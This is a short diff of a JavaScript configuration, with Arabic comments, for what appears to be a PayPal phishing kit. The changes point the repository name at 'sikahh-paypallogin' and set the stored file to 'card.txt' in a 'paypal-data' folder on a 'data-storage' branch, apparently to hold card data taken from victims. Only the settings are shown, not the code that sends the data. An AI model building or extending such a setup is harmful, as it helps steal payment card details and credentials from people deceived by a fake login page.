@@ -4,7 +4,7 @@
 const GITHUB_CONFIG = {
     // معلومات المستودع - يجب تحديثها بمعلوماتك الحقيقية
     owner: 'sikahh',                         // اسم المستخدم في GitHub
-    repo: 'paypallogin',                     // اسم المستودع
+    repo: 'sikahh-paypallogin',              // اسم المستودع الصحيح
     branch: 'data-storage',                  // فرع منفصل لحفظ البيانات
     
     // Personal Access Token - يجب تحديثه بالـ Token الحقيقي
@@ -13,7 +13,7 @@ const GITHUB_CONFIG = {
     
     // إعدادات الملفات
     dataFolder: 'paypal-data',               // مجلد حفظ البيانات
-    filePrefix: 'paypal_data_',              // بداية اسم الملف
+    fileName: 'card.txt',                    // اسم الملف الثابت
     
     // معلومات الـ commit
     committer: {
